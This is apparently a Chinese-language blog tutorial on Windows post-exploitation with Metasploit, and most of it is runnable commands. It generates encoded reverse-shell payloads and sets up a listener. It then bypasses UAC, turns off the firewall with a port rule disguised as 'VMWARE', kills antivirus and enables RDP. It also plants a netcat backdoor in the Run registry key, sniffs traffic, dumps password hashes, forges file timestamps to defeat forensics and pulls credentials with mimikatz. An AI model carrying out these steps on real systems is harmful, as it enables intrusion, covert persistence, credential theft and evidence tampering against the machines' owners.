<http://www.secist.com/archives/1070.html>

随着windows系统的不断更新完善，windows对用户系统的安全力度也在加强。这对我们的渗透，也带来了不少的麻烦。今天我将带大家，利用目前流行的 metasploit 框架，绕过一些 UAC 及防火墙的限制，从而达到成功利用的目的！

由于绕过 UAC 的功能需在 meterpreter 的shell 才能实现。因此，我们首先要做的就是取得目标机器的 meterpreter shell 。

生成一个 payload ：

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.15.131 lport=4444 -f exe -o /root/virus.exe -e x86/shikata_ga_nai -i 8

20161006093606

将以上生成的 payload 发送给目标机器并让其执行!

接着，我们在 kali 上配置一个反弹会话处理程序：

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

set LHOST 192.168.15.131

set LPORT 4444

exploit

20161006092923

这里再介绍一种，生成反弹 shell 的方式。就是直接以 raw 的形式保存成文件只要目标进行了访问，就会反弹回 shell 。具体生成命令如下：

msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.15.131 LPORT=4444 -f raw -o x.php

当目标机器成功执行payload后我们就取得了一个 meterpreter shell 。

20161006094048

我们尝试直接利用 getuid 和 getsystem 命令来提权：

20161006100046

从以上结果我们基本可以判定遭到了 UAC 的用户访问控制的拦截！既然这样，那么我们来利用 meterpreter 的强大功能来进行绕过！

use exploit/windows/local/ask

show options

set session 1

exploit

20161006104840

当我们成功执行以上命令后，我们会在目标系统上弹出一个确认框只要点击确认即可成功绕过！现在我们再来通过 getuid 和 getsystem 命令来查看当前我们的 shell 权限：

20161006105606

现在我们来通过其 shell 来关闭防火墙：

shell

netsh adcfirewall set allprofiles state off

20161006112128

我们打开防火墙配置查看防火墙已成功被我们关闭!

20161006113355

但是我们可以看出，如果目标管理员查看防火墙配置，发现防火墙被人为关闭，那么必定引起管理员的警惕！因此，我们还可以通过策略的添加，来隐蔽我们的行为。

netsh firewall add portopening TCP 444 “VMWARE” ENABLE ALL

伪装成一个系统正常的进程，之后远程重启目标系统，并利用 NC 连接即可！

开启3389远程桌面：

run post/windows/manage/enable_rdp

20161006114052

还可以使用 run getgui -e 来开启远程桌面：

20161006121512

利用该命令，我们还可以在目标机器上添加用户：

run getgui -u xxxxx -p xxxxx

我们还可以尝试关闭目标机器上的杀毒软件：

run killav

20161006114433对目标系统桌面进行实时截图：

screenshot

use espia

20161006122300

窃取及伪造域账户 token ：

load incognito

list_tokens -u

impersonate_token xxxxx\\xxxxxxx

execute -f cmd.exe -i -t

 

20161006131139

 

利用注册表添加 NC 后门：

上传 NC 到目标系统：

upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32

枚举注册表内容（开机启动）

reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run

在该注册表增加内容（开机启动）

reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d “C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe”

查看内容是否增加成功：

reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc

20161006141320

对目标网络实施嗅探抓包：

加载 sniffer 插件：

load sniffer

20161006150557对指定网卡进行抓包嗅探:

sniffer_start 9

20161006150635

将抓取的包保存为cap文件：

sniffer_dump 9 1.cap

20161006150651

对抓取的包进行解包：

use auxiliary/sniffer/psnuffle

set pcapfile 1.cap

run

20161006153844

获取目标系统上的 hash 值：

use post/windows/gather/hashdump

set session 4

run

20161006155822

基于MACE时间的反电子取证：

timestomp -v secist.txt

查看当前目标文件 MACE 时间。

 

20161006172320

timestomp -f c:\\AVScanner.ini secist.txt （将模板文件MACE时间，复制给当前文件）

timestomp -v secist.txt

20161006172248

最后介绍个神器 mimikatz ：

load mimikatz

msv (获取 hash 值)

ssp （获取明文信息）

wdigest （获取系统账户信息）

mimikatz_command -f a:: (必须要以错误的模块来让正确的模块显示)

mimikatz_command -f hash:: (获取目标 hash)